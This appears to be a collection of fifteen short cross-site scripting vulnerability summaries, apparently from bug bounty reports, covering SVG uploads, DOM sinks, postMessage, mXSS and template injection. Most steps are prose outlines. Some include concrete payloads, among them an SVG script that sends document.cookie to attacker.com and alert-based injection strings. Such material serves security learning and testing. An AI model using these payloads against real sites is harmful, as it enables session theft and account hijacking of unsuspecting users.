title: Stored XSS in profile bio via SVG upload
desc: Profile bio allowed SVG uploads. SVG with embedded script executed in every visitor's browser.
steps:
1. Create SVG with <script>fetch('https://attacker.com/?c='+document.cookie)</script>
2. Upload as profile attachment
3. Share profile — XSS fires on every visit

title: Reflected XSS via unencoded JSON eval
desc: Search endpoint reflected query into JSON that was eval()'d by frontend. No HTML encoding applied.
steps:
1. Find search endpoint reflecting input in JSON
2. Inject: ?q="}];alert(1)//
3. Frontend eval() executes injected code

title: DOM XSS via location.hash in SPA
desc: SPA read location.hash and passed it to innerHTML without sanitization.
steps:
1. Find JS reading location.hash → innerHTML
2. Craft URL with malicious hash
3. Send to victim — fires on page load

title: Stored XSS in tweet via mXSS mutation
desc: Tweet content was sanitized on input but mutated by the browser's HTML parser on render, bypassing the sanitizer.
steps:
1. Craft mXSS payload that looks safe but mutates
2. Post as tweet
3. Payload executes when tweet is rendered

title: Stored XSS in report title via markdown renderer
desc: Markdown renderer in report titles did not sanitize HTML. Injecting raw HTML tags executed JavaScript.
steps:
1. Create a report with XSS payload in title
2. Payload stored and rendered for all viewers
3. Fires when staff/triager opens the report

title: XSS via postMessage without origin check
desc: App listened to postMessage events and passed data to innerHTML without validating the origin.
steps:
1. Open target in iframe
2. Send malicious postMessage from attacker page
3. Target processes message and executes XSS

title: Stored XSS in video title
desc: Video title field allowed HTML injection. Stored XSS executed for every user viewing the video page.
steps:
1. Upload video with XSS payload in title
2. Payload stored in DB
3. Executes for all viewers

title: XSS via file name in document upload
desc: Document upload reflected the filename in the response page without encoding. Uploading a file with XSS payload in name triggered execution.
steps: 1. Upload file named: .pdf 2. Navigate to upload confirmation page 3. XSS fires

title: Stored XSS in username field
desc: Username was reflected in multiple pages without encoding. Registering with XSS payload in username caused stored XSS across the platform.
steps:
1. Register account with XSS payload as username
2. Any page displaying username triggers XSS
3. Affects all users who view the profile

title: Reflected XSS in WordPress search via s parameter
desc: WordPress search parameter was reflected in the page without proper encoding in certain themes.
steps:
1. Find WordPress site with vulnerable theme
2. Inject: /?s=<script>alert(1)</script>
3. XSS reflects in search results heading

title: XSS via CSTI in Liquid template engine
desc: User-controlled input was passed into a Liquid template. Injecting {{7*7}} returned 49, confirming CSTI. Escalated to XSS via template injection.
steps:
1. Find input reflected in page via Liquid template
2. Inject: {{7*7}} — if 49 appears, CSTI confirmed
3. Use Liquid XSS payload

title: DOM XSS via open redirect + fragment
desc: Open redirect combined with DOM XSS via fragment identifier. Redirect preserved the hash, which was processed by the destination page's JS.
steps:
1. Find open redirect on target
2. Append XSS payload as fragment
3. Redirect preserves fragment, destination page executes it

title: Stored XSS in ticket comment via HTML injection
desc: Ticket comment field allowed raw HTML. Stored XSS executed for support agents viewing the ticket.
steps:
1. Submit support ticket with XSS in comment
2. Support agent opens ticket
3. XSS fires in agent's browser — session hijack

title: Reflected XSS in error page via URL parameter
desc: Custom error page reflected the requested URL in the page body without encoding. Crafting a URL with XSS payload triggered execution.
steps:
1. Find error page that reflects URL
2. Craft URL with XSS payload
3. Send to victim — fires on page load

title: Stored XSS in customer name field
desc: Customer name was stored and reflected in invoices, emails, and account pages without encoding. XSS payload in name field executed across multiple surfaces.
steps:
1. Update account name to XSS payload
2. Trigger invoice generation or account view
3. XSS fires on every surface displaying the name
